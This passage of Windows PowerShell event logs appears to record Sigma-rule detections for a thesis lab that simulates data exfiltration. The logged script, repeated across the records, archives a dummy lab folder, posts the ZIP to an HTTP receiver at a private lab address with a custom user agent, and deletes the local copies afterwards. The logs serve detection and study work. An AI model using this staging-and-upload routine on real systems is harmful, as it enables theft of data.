{"Timestamp":"2026-07-12T13:29:20.622279882Z","Computer":"LT29.ait.us.es","Channel":"Microsoft-Windows-PowerShell/Operational","EID":4104,"Level":"low","Title":"PowerShell Script With File Upload Capabilities","RecordID":3287653,"Details":"ScriptBlock: # TFM candidate v3 - Controlled staging/archive plus HTTP upload to a local lab receiver.\n# This script uses only dummy lab data and does not require credentials.\n\nparam(\n    [Alias(\"SourcePath\")]\n    [string]$WorkDir = \"\",\n\n    [Alias(\"StagingPath\")]\n    [string]$OutputDir = \"\",\n\n    [string]$ReceiverUrl = \"http://192.168.56.1:8000/upload\",\n    [switch]$EnableUpload,\n    [int]$TimeoutSec = 30,\n    [string]$ZipName = \"tec009_controlled_archive.zip\",\n    [switch]$KeepArtifacts\n)\n\nSet-StrictMode -Version Latest\n$ErrorActionPreference = \"Stop\"\n\n$BasePath = $env:TFM_BASEPATH\nif ([string]::IsNullOrWhiteSpace($BasePath)) {\n    $BasePath = \"C:\\Users\\seguridad\\Desktop\\TFM\\01_ACTIVE_TESTS\\Pruebas\"\n}\n$env:TFM_BASEPATH = $BasePath\n\nif ([string]::IsNullOrWhiteSpace($WorkDir)) {\n    $WorkDir = Join-Path $BasePath \"DUMB_LAB\"\n}\nif ([string]::IsNullOrWhiteSpace($OutputDir)) {\n    $OutputDir = Join-Path $BasePath \"TEC-009_Exfiltracion\\staging_controlled\"\n}\nif (-not $ZipName.ToLowerInvariant().EndsWith(\".zip\")) {\n    $ZipName = \"$ZipName.zip\"\n}\n\nif (-not (Test-Path -LiteralPath $WorkDir)) {\n    throw \"WorkDir does not exist: $WorkDir\"\n}\n\nNew-Item -ItemType Directory -Force -Path $OutputDir | Out-Null\n\n$zipFile = Join-Path $OutputDir $ZipName\n$copyName = \"{0}_copy{1}\" -f [IO.Path]::GetFileNameWithoutExtension($ZipName), [IO.Path]::GetExtension($ZipName)\n$copyFile = Join-Path $OutputDir $copyName\n$summaryFile = Join-Path $OutputDir \"tec009_transfer_summary.json\"\n\nRemove-Item -LiteralPath $zipFile -Force -ErrorAction SilentlyContinue\nRemove-Item -LiteralPath $copyFile -Force -ErrorAction SilentlyContinue\nRemove-Item -LiteralPath $summaryFile -Force -ErrorAction SilentlyContinue\n\nCompress-Archive -Path (Join-Path $WorkDir \"*\") -DestinationPath $zipFile -Force\nCopy-Item -LiteralPath $zipFile -Destination $copyFile -Force\n\n$zipItem = Get-Item -LiteralPath $zipFile\n$copyItem = Get-Item -LiteralPath $copyFile\n$localHash = (Get-FileHash -LiteralPath $zipFile -Algorithm SHA256).Hash.ToLowerInvariant()\n\n$httpStatusCode = $null\n$uploadSucceeded = $false\n$uploadError = \"\"\n$receiverResponse = \"\"\n\nif ($EnableUpload.IsPresent) {\n    try {\n        $response = Invoke-WebRequest `\n            -Uri $ReceiverUrl `\n            -Method POST `\n            -InFile $zipFile `\n            -ContentType \"application/zip\" `\n            -UserAgent \"TFM-TEC009-ControlledUpload/3.0\" `\n            -TimeoutSec $TimeoutSec `\n            -UseBasicParsing\n\n        $httpStatusCode = [int]$response.StatusCode\n        $receiverResponse = [string]$response.Content\n        $uploadSucceeded = ($httpStatusCode -ge 200 -and $httpStatusCode -lt 300)\n    }\n    catch {\n        $uploadError = $_.Exception.Message\n        Write-Warning (\"Controlled upload failed: {0}\" -f $uploadError)\n    }\n}\nelse {\n    $uploadError = \"Upload disabled by parameter.\"\n}\n\n$summary = [ordered]@{\n    Timestamp = (Get-Date).ToString(\"o\")\n    WorkDir = $WorkDir\n    OutputDir = $OutputDir\n    ZipFile = $zipFile\n    CopyFile = $copyFile\n    ZipBytes = $zipItem.Length\n    CopyBytes = $copyItem.Length\n    LocalSHA256 = $localHash\n    ReceiverUrl = $ReceiverUrl\n    EnableUpload = [bool]$EnableUpload\n    TimeoutSec = $TimeoutSec\n    HttpStatusCode = $httpStatusCode\n    UploadSucceeded = $uploadSucceeded\n    UploadError = $uploadError\n    ReceiverResponse = $receiverResponse\n    KeepArtifacts = [bool]$KeepArtifacts\n}\n\n$summary | ConvertTo-Json -Depth 5 | Set-Content -LiteralPath $summaryFile -Encoding UTF8\n\nWrite-Host \"Controlled staging/archive completed.\"\nWrite-Host \"ZIP created: $zipFile\"\nWrite-Host \"ZIP copy created: $copyFile\"\nWrite-Host \"ZIP bytes: $($zipItem.Length)\"\nWrite-Host \"ZIP SHA256: $localHash\"\nWrite-Host \"Receiver URL: $ReceiverUrl\"\nWrite-Host \"Upload enabled: $([bool]$EnableUpload)\"\nWrite-Host \"HTTP status: $httpStatusCode\"\nWrite-Host \"Upload succeeded: $uploadSucceeded\"\nWrite-Host \"Summary: $summaryFile\"\n\nif (-not $KeepArtifacts.IsPresent) {\n    Remove-Item -LiteralPath $zipFile -Force -ErrorAction SilentlyContinue\n    Remove-Item -LiteralPath $copyFile -Force -ErrorAction SilentlyContinue\n    Write-Host \"Local ZIP artifacts removed because KeepArtifacts=false.\"\n}\n\nif ($EnableUpload.IsPresent -and -not $uploadSucceeded) {\n    exit 2\n}\n","_Event":{"System":{"Provider":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":{"Value":4104},"Version":1,"Level":5,"Task":2,"Opcode":15,"Keywords":0,"TimeCreated":{"SystemTime":1783862960.62228},"EventRecordID":3287653,"Correlation":{"ActivityID":"F2694954-11F0-0003-AA22-6FF2F011DD01"},"Execution":{"ProcessID":4956,"ThreadID":12076},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"LT29.ait.us.es","Security":{"UserID":"S-1-5-21-2237245112-686140129-944090608-1004"}},"EventData":{"MessageNumber":1,"MessageTotal":1,"ScriptBlockText":"# TFM candidate v3 - Controlled staging/archive plus HTTP upload to a local lab receiver.\n# This script uses only dummy lab data and does not require credentials.\n\nparam(\n    [Alias(\"SourcePath\")]\n    [string]$WorkDir = \"\",\n\n    [Alias(\"StagingPath\")]\n    [string]$OutputDir = \"\",\n\n    [string]$ReceiverUrl = \"http://192.168.56.1:8000/upload\",\n    [switch]$EnableUpload,\n    [int]$TimeoutSec = 30,\n    [string]$ZipName = \"tec009_controlled_archive.zip\",\n    [switch]$KeepArtifacts\n)\n\nSet-StrictMode -Version Latest\n$ErrorActionPreference = \"Stop\"\n\n$BasePath = $env:TFM_BASEPATH\nif ([string]::IsNullOrWhiteSpace($BasePath)) {\n    $BasePath = \"C:\\Users\\seguridad\\Desktop\\TFM\\01_ACTIVE_TESTS\\Pruebas\"\n}\n$env:TFM_BASEPATH = $BasePath\n\nif ([string]::IsNullOrWhiteSpace($WorkDir)) {\n    $WorkDir = Join-Path $BasePath \"DUMB_LAB\"\n}\nif ([string]::IsNullOrWhiteSpace($OutputDir)) {\n    $OutputDir = Join-Path $BasePath \"TEC-009_Exfiltracion\\staging_controlled\"\n}\nif (-not $ZipName.ToLowerInvariant().EndsWith(\".zip\")) {\n    $ZipName = \"$ZipName.zip\"\n}\n\nif (-not (Test-Path -LiteralPath $WorkDir)) {\n    throw \"WorkDir does not exist: $WorkDir\"\n}\n\nNew-Item -ItemType Directory -Force -Path $OutputDir | Out-Null\n\n$zipFile = Join-Path $OutputDir $ZipName\n$copyName = \"{0}_copy{1}\" -f [IO.Path]::GetFileNameWithoutExtension($ZipName), [IO.Path]::GetExtension($ZipName)\n$copyFile = Join-Path $OutputDir $copyName\n$summaryFile = Join-Path $OutputDir \"tec009_transfer_summary.json\"\n\nRemove-Item -LiteralPath $zipFile -Force -ErrorAction SilentlyContinue\nRemove-Item -LiteralPath $copyFile -Force -ErrorAction SilentlyContinue\nRemove-Item -LiteralPath $summaryFile -Force -ErrorAction SilentlyContinue\n\nCompress-Archive -Path (Join-Path $WorkDir \"*\") -DestinationPath $zipFile -Force\nCopy-Item -LiteralPath $zipFile -Destination $copyFile -Force\n\n$zipItem = Get-Item -LiteralPath $zipFile\n$copyItem = Get-Item -LiteralPath $copyFile\n$localHash = (Get-FileHash -LiteralPath $zipFile -Algorithm SHA256).Hash.ToLowerInvariant()\n\n$httpStatusCode = $null\n$uploadSucceeded = $false\n$uploadError = \"\"\n$receiverResponse = \"\"\n\nif ($EnableUpload.IsPresent) {\n    try {\n        $response = Invoke-WebRequest `\n            -Uri $ReceiverUrl `\n            -Method POST `\n            -InFile $zipFile `\n            -ContentType \"application/zip\" `\n            -UserAgent \"TFM-TEC009-ControlledUpload/3.0\" `\n            -TimeoutSec $TimeoutSec `\n            -UseBasicParsing\n\n        $httpStatusCode = [int]$response.StatusCode\n        $receiverResponse = [string]$response.Content\n        $uploadSucceeded = ($httpStatusCode -ge 200 -and $httpStatusCode -lt 300)\n    }\n    catch {\n        $uploadError = $_.Exception.Message\n        Write-Warning (\"Controlled upload failed: {0}\" -f $uploadError)\n    }\n}\nelse {\n    $uploadError = \"Upload disabled by parameter.\"\n}\n\n$summary = [ordered]@{\n    Timestamp = (Get-Date).ToString(\"o\")\n    WorkDir = $WorkDir\n    OutputDir = $OutputDir\n    ZipFile = $zipFile\n    CopyFile = $copyFile\n    ZipBytes = $zipItem.Length\n    CopyBytes = $copyItem.Length\n    LocalSHA256 = $localHash\n    ReceiverUrl = $ReceiverUrl\n    EnableUpload = [bool]$EnableUpload\n    TimeoutSec = $TimeoutSec\n    HttpStatusCode = $httpStatusCode\n    UploadSucceeded = $uploadSucceeded\n    UploadError = $uploadError\n    ReceiverResponse = $receiverResponse\n    KeepArtifacts = [bool]$KeepArtifacts\n}\n\n$summary | ConvertTo-Json -Depth 5 | Set-Content -LiteralPath $summaryFile -Encoding UTF8\n\nWrite-Host \"Controlled staging/archive completed.\"\nWrite-Host \"ZIP created: $zipFile\"\nWrite-Host \"ZIP copy created: $copyFile\"\nWrite-Host \"ZIP bytes: $($zipItem.Length)\"\nWrite-Host \"ZIP SHA256: $localHash\"\nWrite-Host \"Receiver URL: $ReceiverUrl\"\nWrite-Host \"Upload enabled: $([bool]$EnableUpload)\"\nWrite-Host \"HTTP status: $httpStatusCode\"\nWrite-Host \"Upload succeeded: $uploadSucceeded\"\nWrite-Host \"Summary: $summaryFile\"\n\nif (-not $KeepArtifacts.IsPresent) {\n    Remove-Item -LiteralPath $zipFile -Force -ErrorAction SilentlyContinue\n    Remove-Item -LiteralPath $copyFile -Force -ErrorAction SilentlyContinue\n    Write-Host \"Local ZIP artifacts removed because KeepArtifacts=false.\"\n}\n\nif ($EnableUpload.IsPresent -and -not $uploadSucceeded) {\n    exit 2\n}\n","ScriptBlockId":"622fc977-93d2-4ba5-b172-df52bf57b8a9","Path":"C:\\Users\\seguridad\\Desktop\\TFM\\01_ACTIVE_TESTS\\Pruebas\\TEC-009_Exfiltracion\\exfiltracion_v3.ps1"},"Message":"Creando texto de bloque de script (1 de 1):\n# TFM candidate v3 - Controlled staging/archive plus HTTP upload to a local lab receiver.\n# This script uses only dummy lab data and does not require credentials.\n\nparam(\n    [Alias(\"SourcePath\")]\n    [string]$WorkDir = \"\",\n\n    [Alias(\"StagingPath\")]\n    [string]$OutputDir = \"\",\n\n    [string]$ReceiverUrl = \"http://192.168.56.1:8000/upload\",\n    [switch]$EnableUpload,\n    [int]$TimeoutSec = 30,\n    [string]$ZipName = \"tec009_controlled_archive.zip\",\n    [switch]$KeepArtifacts\n)\n\nSet-StrictMode -Version Latest\n$ErrorActionPreference = \"Stop\"\n\n$BasePath = $env:TFM_BASEPATH\nif ([string]::IsNullOrWhiteSpace($BasePath)) {\n    $BasePath = \"C:\\Users\\seguridad\\Desktop\\TFM\\01_ACTIVE_TESTS\\Pruebas\"\n}\n$env:TFM_BASEPATH = $BasePath\n\nif ([string]::IsNullOrWhiteSpace($WorkDir)) {\n    $WorkDir = Join-Path $BasePath \"DUMB_LAB\"\n}\nif ([string]::IsNullOrWhiteSpace($OutputDir)) {\n    $OutputDir = Join-Path $BasePath \"TEC-009_Exfiltracion\\staging_controlled\"\n}\nif (-not $ZipName.ToLowerInvariant().EndsWith(\".zip\")) {\n    $ZipName = \"$ZipName.zip\"\n}\n\nif (-not (Test-Path -LiteralPath $WorkDir)) {\n    throw \"WorkDir does not exist: $WorkDir\"\n}\n\nNew-Item -ItemType Directory -Force -Path $OutputDir | Out-Null\n\n$zipFile = Join-Path $OutputDir $ZipName\n$copyName = \"{0}_copy{1}\" -f [IO.Path]::GetFileNameWithoutExtension($ZipName), [IO.Path]::GetExtension($ZipName)\n$copyFile = Join-Path $OutputDir $copyName\n$summaryFile = Join-Path $OutputDir \"tec009_transfer_summary.json\"\n\nRemove-Item -LiteralPath $zipFile -Force -ErrorAction SilentlyContinue\nRemove-Item -LiteralPath $copyFile -Force -ErrorAction SilentlyContinue\nRemove-Item -LiteralPath $summaryFile -Force -ErrorAction SilentlyContinue\n\nCompress-Archive -Path (Join-Path $WorkDir \"*\") -DestinationPath $zipFile -Force\nCopy-Item -LiteralPath $zipFile -Destination $copyFile -Force\n\n$zipItem = Get-Item -LiteralPath $zipFile\n$copyItem = Get-Item -LiteralPath $copyFile\n$localHash = (Get-FileHash -LiteralPath $zipFile -Algorithm SHA256).Hash.ToLowerInvariant()\n\n$httpStatusCode = $null\n$uploadSucceeded = $false\n$uploadError = \"\"\n$receiverResponse = \"\"\n\nif ($EnableUpload.IsPresent) {\n    try {\n        $response = Invoke-WebRequest `\n            -Uri $ReceiverUrl `\n            -Method POST `\n            -InFile $zipFile `\n            -ContentType \"application/zip\" `\n            -UserAgent \"TFM-TEC009-ControlledUpload/3.0\" `\n            -TimeoutSec $TimeoutSec `\n            -UseBasicParsing\n\n        $httpStatusCode = [int]$response.StatusCode\n        $receiverResponse = [string]$response.Content\n        $uploadSucceeded = ($httpStatusCode -ge 200 -and $httpStatusCode -lt 300)\n    }\n    catch {\n        $uploadError = $_.Exception.Message\n        Write-Warning (\"Controlled upload failed: {0}\" -f $uploadError)\n    }\n}\nelse {\n    $uploadError = \"Upload disabled by parameter.\"\n}\n\n$summary = [ordered]@{\n    Timestamp = (Get-Date).ToString(\"o\")\n    WorkDir = $WorkDir\n    OutputDir = $OutputDir\n    ZipFile = $zipFile\n    CopyFile = $copyFile\n    ZipBytes = $zipItem.Length\n    CopyBytes = $copyItem.Length\n    LocalSHA256 = $localHash\n    ReceiverUrl = $ReceiverUrl\n    EnableUpload = [bool]$EnableUpload\n    TimeoutSec = $TimeoutSec\n    HttpStatusCode = $httpStatusCode\n    UploadSucceeded = $uploadSucceeded\n    UploadError = $uploadError\n    ReceiverResponse = $receiverResponse\n    KeepArtifacts = [bool]$KeepArtifacts\n}\n\n$summary | ConvertTo-Json -Depth 5 | Set-Content -LiteralPath $summaryFile -Encoding UTF8\n\nWrite-Host \"Controlled staging/archive completed.\"\nWrite-Host \"ZIP created: $zipFile\"\nWrite-Host \"ZIP copy created: $copyFile\"\nWrite-Host \"ZIP bytes: $($zipItem.Length)\"\nWrite-Host \"ZIP SHA256: $localHash\"\nWrite-Host \"Receiver URL: $ReceiverUrl\"\nWrite-Host \"Upload enabled: $([bool]$EnableUpload)\"\nWrite-Host \"HTTP status: $httpStatusCode\"\nWrite-Host \"Upload succeeded: $uploadSucceeded\"\nWrite-Host \"Summary: $summaryFile\"\n\nif (-not $KeepArtifacts.IsPresent) {\n    Remove-Item -LiteralPath $zipFile -Force -ErrorAction SilentlyContinue\n    Remove-Item -LiteralPath $copyFile -Force -ErrorAction SilentlyContinue\n    Write-Host \"Local ZIP artifacts removed because KeepArtifacts=false.\"\n}\n\nif ($EnableUpload.IsPresent -and -not $uploadSucceeded) {\n    exit 2\n}\n\n\nId. de bloque de script: 622fc977-93d2-4ba5-b172-df52bf57b8a9\nRuta de acceso: C:\\Users\\seguridad\\Desktop\\TFM\\01_ACTIVE_TESTS\\Pruebas\\TEC-009_Exfiltracion\\exfiltracion_v3.ps1\r\n"},"_Source":"Windows.Sigma.BaseEvents","ClientId":"C.364907172793f8c7","_ts":1783863135483}
{"Timestamp":"2026-07-12T13:29:20.622279882Z","Computer":"LT29.ait.us.es","Channel":"Microsoft-Windows-PowerShell/Operational","EID":4104,"Level":"medium","Title":"Change User Agents with WebRequest","RecordID":3287653,"Details":"ScriptBlock: # TFM candidate v3 - Controlled staging/archive plus HTTP upload to a local lab receiver.\n# This script uses only dummy lab data and does not require credentials.\n\nparam(\n    [Alias(\"SourcePath\")]\n    [string]$WorkDir = \"\",\n\n    [Alias(\"StagingPath\")]\n    [string]$OutputDir = \"\",\n\n    [string]$ReceiverUrl = \"http://192.168.56.1:8000/upload\",\n    [switch]$EnableUpload,\n    [int]$TimeoutSec = 30,\n    [string]$ZipName = \"tec009_controlled_archive.zip\",\n    [switch]$KeepArtifacts\n)\n\nSet-StrictMode -Version Latest\n$ErrorActionPreference = \"Stop\"\n\n$BasePath = $env:TFM_BASEPATH\nif ([string]::IsNullOrWhiteSpace($BasePath)) {\n    $BasePath = \"C:\\Users\\seguridad\\Desktop\\TFM\\01_ACTIVE_TESTS\\Pruebas\"\n}\n$env:TFM_BASEPATH = $BasePath\n\nif ([string]::IsNullOrWhiteSpace($WorkDir)) {\n    $WorkDir = Join-Path $BasePath \"DUMB_LAB\"\n}\nif ([string]::IsNullOrWhiteSpace($OutputDir)) {\n    $OutputDir = Join-Path $BasePath \"TEC-009_Exfiltracion\\staging_controlled\"\n}\nif (-not $ZipName.ToLowerInvariant().EndsWith(\".zip\")) {\n    $ZipName = \"$ZipName.zip\"\n}\n\nif (-not (Test-Path -LiteralPath $WorkDir)) {\n    throw \"WorkDir does not exist: $WorkDir\"\n}\n\nNew-Item -ItemType Directory -Force -Path $OutputDir | Out-Null\n\n$zipFile = Join-Path $OutputDir $ZipName\n$copyName = \"{0}_copy{1}\" -f [IO.Path]::GetFileNameWithoutExtension($ZipName), [IO.Path]::GetExtension($ZipName)\n$copyFile = Join-Path $OutputDir $copyName\n$summaryFile = Join-Path $OutputDir \"tec009_transfer_summary.json\"\n\nRemove-Item -LiteralPath $zipFile -Force -ErrorAction SilentlyContinue\nRemove-Item -LiteralPath $copyFile -Force -ErrorAction SilentlyContinue\nRemove-Item -LiteralPath $summaryFile -Force -ErrorAction SilentlyContinue\n\nCompress-Archive -Path (Join-Path $WorkDir \"*\") -DestinationPath $zipFile -Force\nCopy-Item -LiteralPath $zipFile -Destination $copyFile -Force\n\n$zipItem = Get-Item -LiteralPath $zipFile\n$copyItem = Get-Item -LiteralPath $copyFile\n$localHash = (Get-FileHash -LiteralPath $zipFile -Algorithm SHA256).Hash.ToLowerInvariant()\n\n$httpStatusCode = $null\n$uploadSucceeded = $false\n$uploadError = \"\"\n$receiverResponse = \"\"\n\nif ($EnableUpload.IsPresent) {\n    try {\n        $response = Invoke-WebRequest `\n            -Uri $ReceiverUrl `\n            -Method POST `\n            -InFile $zipFile `\n            -ContentType \"application/zip\" `\n            -UserAgent \"TFM-TEC009-ControlledUpload/3.0\" `\n            -TimeoutSec $TimeoutSec `\n            -UseBasicParsing\n\n        $httpStatusCode = [int]$response.StatusCode\n        $receiverResponse = [string]$response.Content\n        $uploadSucceeded = ($httpStatusCode -ge 200 -and $httpStatusCode -lt 300)\n    }\n    catch {\n        $uploadError = $_.Exception.Message\n        Write-Warning (\"Controlled upload failed: {0}\" -f $uploadError)\n    }\n}\nelse {\n    $uploadError = \"Upload disabled by parameter.\"\n}\n\n$summary = [ordered]@{\n    Timestamp = (Get-Date).ToString(\"o\")\n    WorkDir = $WorkDir\n    OutputDir = $OutputDir\n    ZipFile = $zipFile\n    CopyFile = $copyFile\n    ZipBytes = $zipItem.Length\n    CopyBytes = $copyItem.Length\n    LocalSHA256 = $localHash\n    ReceiverUrl = $ReceiverUrl\n    EnableUpload = [bool]$EnableUpload\n    TimeoutSec = $TimeoutSec\n    HttpStatusCode = $httpStatusCode\n    UploadSucceeded = $uploadSucceeded\n    UploadError = $uploadError\n    ReceiverResponse = $receiverResponse\n    KeepArtifacts = [bool]$KeepArtifacts\n}\n\n$summary | ConvertTo-Json -Depth 5 | Set-Content -LiteralPath $summaryFile -Encoding UTF8\n\nWrite-Host \"Controlled staging/archive completed.\"\nWrite-Host \"ZIP created: $zipFile\"\nWrite-Host \"ZIP copy created: $copyFile\"\nWrite-Host \"ZIP bytes: $($zipItem.Length)\"\nWrite-Host \"ZIP SHA256: $localHash\"\nWrite-Host \"Receiver URL: $ReceiverUrl\"\nWrite-Host \"Upload enabled: $([bool]$EnableUpload)\"\nWrite-Host \"HTTP status: $httpStatusCode\"\nWrite-Host \"Upload succeeded: $uploadSucceeded\"\nWrite-Host \"Summary: $summaryFile\"\n\nif (-not $KeepArtifacts.IsPresent) {\n    Remove-Item -LiteralPath $zipFile -Force -ErrorAction SilentlyContinue\n    Remove-Item -LiteralPath $copyFile -Force -ErrorAction SilentlyContinue\n    Write-Host \"Local ZIP artifacts removed because KeepArtifacts=false.\"\n}\n\nif ($EnableUpload.IsPresent -and -not $uploadSucceeded) {\n    exit 2\n}\n","_Event":{"System":{"Provider":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":{"Value":4104},"Version":1,"Level":5,"Task":2,"Opcode":15,"Keywords":0,"TimeCreated":{"SystemTime":1783862960.62228},"EventRecordID":3287653,"Correlation":{"ActivityID":"F2694954-11F0-0003-AA22-6FF2F011DD01"},"Execution":{"ProcessID":4956,"ThreadID":12076},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"LT29.ait.us.es","Security":{"UserID":"S-1-5-21-2237245112-686140129-944090608-1004"}},"EventData":{"MessageNumber":1,"MessageTotal":1,"ScriptBlockText":"# TFM candidate v3 - Controlled staging/archive plus HTTP upload to a local lab receiver.\n# This script uses only dummy lab data and does not require credentials.\n\nparam(\n    [Alias(\"SourcePath\")]\n    [string]$WorkDir = \"\",\n\n    [Alias(\"StagingPath\")]\n    [string]$OutputDir = \"\",\n\n    [string]$ReceiverUrl = \"http://192.168.56.1:8000/upload\",\n    [switch]$EnableUpload,\n    [int]$TimeoutSec = 30,\n    [string]$ZipName = \"tec009_controlled_archive.zip\",\n    [switch]$KeepArtifacts\n)\n\nSet-StrictMode -Version Latest\n$ErrorActionPreference = \"Stop\"\n\n$BasePath = $env:TFM_BASEPATH\nif ([string]::IsNullOrWhiteSpace($BasePath)) {\n    $BasePath = \"C:\\Users\\seguridad\\Desktop\\TFM\\01_ACTIVE_TESTS\\Pruebas\"\n}\n$env:TFM_BASEPATH = $BasePath\n\nif ([string]::IsNullOrWhiteSpace($WorkDir)) {\n    $WorkDir = Join-Path $BasePath \"DUMB_LAB\"\n}\nif ([string]::IsNullOrWhiteSpace($OutputDir)) {\n    $OutputDir = Join-Path $BasePath \"TEC-009_Exfiltracion\\staging_controlled\"\n}\nif (-not $ZipName.ToLowerInvariant().EndsWith(\".zip\")) {\n    $ZipName = \"$ZipName.zip\"\n}\n\nif (-not (Test-Path -LiteralPath $WorkDir)) {\n    throw \"WorkDir does not exist: $WorkDir\"\n}\n\nNew-Item -ItemType Directory -Force -Path $OutputDir | Out-Null\n\n$zipFile = Join-Path $OutputDir $ZipName\n$copyName = \"{0}_copy{1}\" -f [IO.Path]::GetFileNameWithoutExtension($ZipName), [IO.Path]::GetExtension($ZipName)\n$copyFile = Join-Path $OutputDir $copyName\n$summaryFile = Join-Path $OutputDir \"tec009_transfer_summary.json\"\n\nRemove-Item -LiteralPath $zipFile -Force -ErrorAction SilentlyContinue\nRemove-Item -LiteralPath $copyFile -Force -ErrorAction SilentlyContinue\nRemove-Item -LiteralPath $summaryFile -Force -ErrorAction SilentlyContinue\n\nCompress-Archive -Path (Join-Path $WorkDir \"*\") -DestinationPath $zipFile -Force\nCopy-Item -LiteralPath $zipFile -Destination $copyFile -Force\n\n$zipItem = Get-Item -LiteralPath $zipFile\n$copyItem = Get-Item -LiteralPath $copyFile\n$localHash = (Get-FileHash -LiteralPath $zipFile -Algorithm SHA256).Hash.ToLowerInvariant()\n\n$httpStatusCode = $null\n$uploadSucceeded = $false\n$uploadError = \"\"\n$receiverResponse = \"\"\n\nif ($EnableUpload.IsPresent) {\n    try {\n        $response = Invoke-WebRequest `\n            -Uri $ReceiverUrl `\n            -Method POST `\n            -InFile $zipFile `\n            -ContentType \"application/zip\" `\n            -UserAgent \"TFM-TEC009-ControlledUpload/3.0\" `\n            -TimeoutSec $TimeoutSec `\n            -UseBasicParsing\n\n        $httpStatusCode = [int]$response.StatusCode\n        $receiverResponse = [string]$response.Content\n        $uploadSucceeded = ($httpStatusCode -ge 200 -and $httpStatusCode -lt 300)\n    }\n    catch {\n        $uploadError = $_.Exception.Message\n        Write-Warning (\"Controlled upload failed: {0}\" -f $uploadError)\n    }\n}\nelse {\n    $uploadError = \"Upload disabled by parameter.\"\n}\n\n$summary = [ordered]@{\n    Timestamp = (Get-Date).ToString(\"o\")\n    WorkDir = $WorkDir\n    OutputDir = $OutputDir\n    ZipFile = $zipFile\n    CopyFile = $copyFile\n    ZipBytes = $zipItem.Length\n    CopyBytes = $copyItem.Length\n    LocalSHA256 = $localHash\n    ReceiverUrl = $ReceiverUrl\n    EnableUpload = [bool]$EnableUpload\n    TimeoutSec = $TimeoutSec\n    HttpStatusCode = $httpStatusCode\n    UploadSucceeded = $uploadSucceeded\n    UploadError = $uploadError\n    ReceiverResponse = $receiverResponse\n    KeepArtifacts = [bool]$KeepArtifacts\n}\n\n$summary | ConvertTo-Json -Depth 5 | Set-Content -LiteralPath $summaryFile -Encoding UTF8\n\nWrite-Host \"Controlled staging/archive completed.\"\nWrite-Host \"ZIP created: $zipFile\"\nWrite-Host \"ZIP copy created: $copyFile\"\nWrite-Host \"ZIP bytes: $($zipItem.Length)\"\nWrite-Host \"ZIP SHA256: $localHash\"\nWrite-Host \"Receiver URL: $ReceiverUrl\"\nWrite-Host \"Upload enabled: $([bool]$EnableUpload)\"\nWrite-Host \"HTTP status: $httpStatusCode\"\nWrite-Host \"Upload succeeded: $uploadSucceeded\"\nWrite-Host \"Summary: $summaryFile\"\n\nif (-not $KeepArtifacts.IsPresent) {\n    Remove-Item -LiteralPath $zipFile -Force -ErrorAction SilentlyContinue\n    Remove-Item -LiteralPath $copyFile -Force -ErrorAction SilentlyContinue\n    Write-Host \"Local ZIP artifacts removed because KeepArtifacts=false.\"\n}\n\nif ($EnableUpload.IsPresent -and -not $uploadSucceeded) {\n    exit 2\n}\n","ScriptBlockId":"622fc977-93d2-4ba5-b172-df52bf57b8a9","Path":"C:\\Users\\seguridad\\Desktop\\TFM\\01_ACTIVE_TESTS\\Pruebas\\TEC-009_Exfiltracion\\exfiltracion_v3.ps1"},"Message":"Creando texto de bloque de script (1 de 1):\n# TFM candidate v3 - Controlled staging/archive plus HTTP upload to a local lab receiver.\n# This script uses only dummy lab data and does not require credentials.\n\nparam(\n    [Alias(\"SourcePath\")]\n    [string]$WorkDir = \"\",\n\n    [Alias(\"StagingPath\")]\n    [string]$OutputDir = \"\",\n\n    [string]$ReceiverUrl = \"http://192.168.56.1:8000/upload\",\n    [switch]$EnableUpload,\n    [int]$TimeoutSec = 30,\n    [string]$ZipName = \"tec009_controlled_archive.zip\",\n    [switch]$KeepArtifacts\n)\n\nSet-StrictMode -Version Latest\n$ErrorActionPreference = \"Stop\"\n\n$BasePath = $env:TFM_BASEPATH\nif ([string]::IsNullOrWhiteSpace($BasePath)) {\n    $BasePath = \"C:\\Users\\seguridad\\Desktop\\TFM\\01_ACTIVE_TESTS\\Pruebas\"\n}\n$env:TFM_BASEPATH = $BasePath\n\nif ([string]::IsNullOrWhiteSpace($WorkDir)) {\n    $WorkDir = Join-Path $BasePath \"DUMB_LAB\"\n}\nif ([string]::IsNullOrWhiteSpace($OutputDir)) {\n    $OutputDir = Join-Path $BasePath \"TEC-009_Exfiltracion\\staging_controlled\"\n}\nif (-not $ZipName.ToLowerInvariant().EndsWith(\".zip\")) {\n    $ZipName = \"$ZipName.zip\"\n}\n\nif (-not (Test-Path -LiteralPath $WorkDir)) {\n    throw \"WorkDir does not exist: $WorkDir\"\n}\n\nNew-Item -ItemType Directory -Force -Path $OutputDir | Out-Null\n\n$zipFile = Join-Path $OutputDir $ZipName\n$copyName = \"{0}_copy{1}\" -f [IO.Path]::GetFileNameWithoutExtension($ZipName), [IO.Path]::GetExtension($ZipName)\n$copyFile = Join-Path $OutputDir $copyName\n$summaryFile = Join-Path $OutputDir \"tec009_transfer_summary.json\"\n\nRemove-Item -LiteralPath $zipFile -Force -ErrorAction SilentlyContinue\nRemove-Item -LiteralPath $copyFile -Force -ErrorAction SilentlyContinue\nRemove-Item -LiteralPath $summaryFile -Force -ErrorAction SilentlyContinue\n\nCompress-Archive -Path (Join-Path $WorkDir \"*\") -DestinationPath $zipFile -Force\nCopy-Item -LiteralPath $zipFile -Destination $copyFile -Force\n\n$zipItem = Get-Item -LiteralPath $zipFile\n$copyItem = Get-Item -LiteralPath $copyFile\n$localHash = (Get-FileHash -LiteralPath $zipFile -Algorithm SHA256).Hash.ToLowerInvariant()\n\n$httpStatusCode = $null\n$uploadSucceeded = $false\n$uploadError = \"\"\n$receiverResponse = \"\"\n\nif ($EnableUpload.IsPresent) {\n    try {\n        $response = Invoke-WebRequest `\n            -Uri $ReceiverUrl `\n            -Method POST `\n            -InFile $zipFile `\n            -ContentType \"application/zip\" `\n            -UserAgent \"TFM-TEC009-ControlledUpload/3.0\" `\n            -TimeoutSec $TimeoutSec `\n            -UseBasicParsing\n\n        $httpStatusCode = [int]$response.StatusCode\n        $receiverResponse = [string]$response.Content\n        $uploadSucceeded = ($httpStatusCode -ge 200 -and $httpStatusCode -lt 300)\n    }\n    catch {\n        $uploadError = $_.Exception.Message\n        Write-Warning (\"Controlled upload failed: {0}\" -f $uploadError)\n    }\n}\nelse {\n    $uploadError = \"Upload disabled by 